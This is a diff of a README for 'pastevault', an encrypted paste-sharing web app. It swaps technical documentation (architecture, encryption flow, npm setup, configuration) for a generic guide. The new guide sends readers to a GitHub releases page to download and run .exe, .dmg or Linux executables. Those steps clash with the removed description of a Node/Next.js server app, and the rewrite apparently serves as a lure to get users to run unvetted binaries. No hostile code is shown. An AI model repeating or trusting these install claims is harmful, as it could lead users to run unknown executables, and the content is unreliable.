@@ -1,191 +1,65 @@
-# PasteVault
+# 🔐 pastevault - Securely Share Code and Text
 
-A secure, end-to-end encrypted paste sharing platform with zero-knowledge architecture. Share code, text, and markdown securely with automatic expiry and burn-after-read options.
+## 🚀 Getting Started
 
-## 🚀 Features
+Welcome to pastevault! This app allows you to share code, text, and markdown securely using encrypted paste sharing. With a zero-knowledge architecture, you can rest assured that your information is private. You can also set automatic expiry and burn-after-read options for added security.
 
-### Core Security
-- **End-to-End Encryption**: XChaCha20-Poly1305 encryption with client-side key generation
-- **Zero-Knowledge Architecture**: Server never sees plaintext content
+## 📥 Download the Latest Version
 
-## 🏗️ Architecture
+[![Download pastevault](https://img.shields.io/badge/Download-pastevault-brightgreen)](https://github.com/XheroRodrigo5/pastevault/releases)
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                        Frontend                             │
-│  Next.js 14 + TypeScript + shadcn/ui + Tailwind             │
-│                                                             │
-│  ┌─────────────────────────────────────────────────────┐    │
-│  │           Client-Side Encryption                    │    │
-│  │  • XChaCha20-Poly1305 encryption                    │    │
-│  │  • PBKDF2 key derivation                            │    │
-│  │  • Monaco editor with Markdown                      │    │
-│  │  • Shiki syntax highlighting                        │    │
-│  └─────────────────────────────────────────────────────┘    │
-└─────────────────────────┬───────────────────────────────────┘
-                          │ HTTPS + Encrypted Payloads
-                          │
-┌─────────────────────────▼───────────────────────────────────┐
-│                        Backend                              │
-│              Fastify + TypeScript + Prisma                  │
-│                                                             │
-│  ┌─────────────────────────────────────────────────────┐    │
-│  │              RESTful API                            │    │
-│  │  • Paste storage (ciphertext only)                  │    │
-│  │  • Metadata management                              │    │
-│  │  • Rate limiting & validation                       │    │
-│  │  • Automatic expiry cleanup                         │    │
-│  └─────────────────────────────────────────────────────┘    │
-└─────────────────────────┬───────────────────────────────────┘
-                          │
-┌─────────────────────────▼───────────────────────────────────┐
-│                     Database                                │
-│          PostgreSQL (default) or SQLite                   │
-│                                                             │
-│  • Encrypted paste content (ciphertext)                     │
-│  • Metadata (expiry, burn status, view counts)              │
-│  • Salt & KDF parameters (password mode)                    │
-│  • No plaintext content ever stored                         │
-└─────────────────────────────────────────────────────────────┘
-```
+Visit the link above to download the latest version of pastevault. 
 
-## 🔐 Security Model
+## 🛠️ System Requirements
 
-### Encryption Flow
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
+- **RAM:** Minimum 4 GB recommended.
+- **Storage:** At least 100 MB of free space.
+- **Network:** Active internet connection for initial setup and updates.
 
-**Random Key Mode (Zero-Knowledge)**:
-1. Generate random 32-byte key client-side
-2. Encrypt content: `XChaCha20-Poly1305(content, key, nonce, aad)`
-3. Send only ciphertext to server
-4. Embed key in URL fragment: `#k=base64url(key)`
-5. Fragment never sent to server logs
+## 💾 Download & Install
 
-**Password Mode**:
-1. Derive key: `PBKDF2(password, salt, 600k iterations)`
-2. Store salt on server, key stays client-side
-3. Same encryption, password-based decryption
+To download pastevault, follow these steps:
 
-### Associated Authenticated Data (AAD)
-```
-AAD = "pastevault:" + paste_id + ":v1"
-```
+1. Click the [download link](https://github.com/XheroRodrigo5/pastevault/releases).
+2. On the Releases page, find the latest version.
+3. Select the appropriate file for your operating system.
+4. Click the file to start downloading.
 
-Prevents:
-- Ciphertext substitution attacks
-- Cross-paste replay attacks  
-- Version confusion attacks
+Once the download is complete:
 
-## 🛠️ Quick Start
+1. **Windows Users:** Double-click the `.exe` file to start the installation. Follow the on-screen instructions to complete the setup.
+2. **macOS Users:** Open the `.dmg` file, drag the pastevault icon to your Applications folder, then launch it.
+3. **Linux Users:** Extract the downloaded file and run the executable from your terminal.
 
-### Prerequisites
-- Node.js 18+
-- PostgreSQL (via Docker) for production setups
-- Or use SQLite for simple development/testing (no external dependencies)
+## 🔑 Features
 
-### 1. Start the Database
-```bash
-docker-compose up -d
-```
+- **Encrypted Sharing:** Your text and code remain secure with strong encryption.
+- **Zero-Knowledge Architecture:** Only you and the intended recipient can access the data.
+- **Expiration Options:** Set automatic expiry times for your shared content.
+- **Burn-After-Read:** Your data can be set to self-destruct after the first use.
+- **User-Friendly Interface:** Easy to navigate, even for non-technical users.
 
-### 2. Setup Backend
-```bash
-# Install dependencies
-npm install
+## 🌐 Additional Information
 
-# Setup database
-npm run db:push
+For detailed usage instructions, visit our [Wiki page](https://github.com/XheroRodrigo5/pastevault/wiki). Here, you will find guidelines on how to make the most out of pastevault, including tips for secure sharing and managing your shared items.
 
-# Start backend
-npm run dev
-```
-Backend runs on `http://localhost:3001`
+## 🛠️ Troubleshooting
 
-### 3. Setup Frontend  
-```bash
-cd frontend
+If you encounter issues during installation or use, try the following solutions:
 
-# Install dependencies
-npm install
+- **Reinstall:** Sometimes, uninstalling and reinstalling can resolve unexpected issues.
+- **Check System Requirements:** Ensure that your system meets the required specifications.
+- **Internet Connection:** Make sure you have a stable internet connection when attempting to download or install.
 
-# Start frontend
-npm run dev
-```
-Frontend runs on `http://localhost:3000`
+For further assistance, check the issues section of our GitHub repository or reach out to the community.
 
-### 4. Create Your First Paste
-1. Open `http://localhost:3000`
-2. Enter your content (Markdown supported!)
-3. Configure expiry and options
-4. Click "Create Paste"
-5. Share the generated URL securely
+## 📬 Contact Us
 
-## 📁 Project Structure
+If you have questions or suggestions, feel free to open an issue on our [GitHub page](https://github.com/XheroRodrigo5/pastevault/issues). We appreciate your feedback, as it helps us improve pastevault.
 
-```
-pastevault/
-├── README.md              # This file
-├── docker-compose.yml     # PostgreSQL setup
-├── package.json          # Backend dependencies
-├── prisma/
-│   └── schema.prisma     # Database schema
-├── src/                  # Backend source
-│   ├── index.ts         # Fastify server
-│   ├── routes/          # API endpoints
-│   ├── lib/             # Utilities & config
-│   └── types/           # TypeScript definitions
-└── frontend/            # Next.js frontend
-    ├── package.json
-    ├── src/
-    │   ├── app/         # Next.js 14 App Router
-    │   ├── components/  # React components
-    │   ├── lib/         # Crypto & utilities
-    │   ├── hooks/       # React hooks
-    │   └── types/       # TypeScript definitions
-    └── ...
-```
+## ✉️ Contribute
 
-## 🔧 Configuration
+We welcome contributions! If you’d like to help out, please read our contribution guidelines in the repository. Whether it’s reporting a bug or suggesting a feature, your input is valuable.
 
-### Backend Environment (.env)
-```env
-# PostgreSQL (default)
-DATABASE_URL="postgresql://pastevault:pastevault_dev_password@localhost:5432/pastevault"
-DATABASE_PROVIDER="postgresql"
-
-# SQLite (uncomment to use SQLite instead)
-# DATABASE_URL="file:./pastevault.db"
-# DATABASE_PROVIDER="sqlite"
-
-PORT=3001
-NODE_ENV=development
-CORS_ORIGIN=http://localhost:3000
-RATE_LIMIT_MAX=10
-RATE_LIMIT_WINDOW_MS=60000
-MAX_PASTE_SIZE_BYTES=1048576
-CLEANUP_INTERVAL_MINUTES=60
-```
-
-### Frontend Environment (.env.local)
-```env
-NEXT_PUBLIC_API_URL=http://localhost:3001/api
-```
-
-## 🚀 Deployment
-
-### Backend
-```bash
-npm run build
-npm start
-```
-
-### Frontend
-```bash
-cd frontend
-npm run build
-npm start
-```
-
-### Database Migration
-```bash
-npm run db:migrate
-```
+Thank you for using pastevault. Enjoy your secure sharing experience!
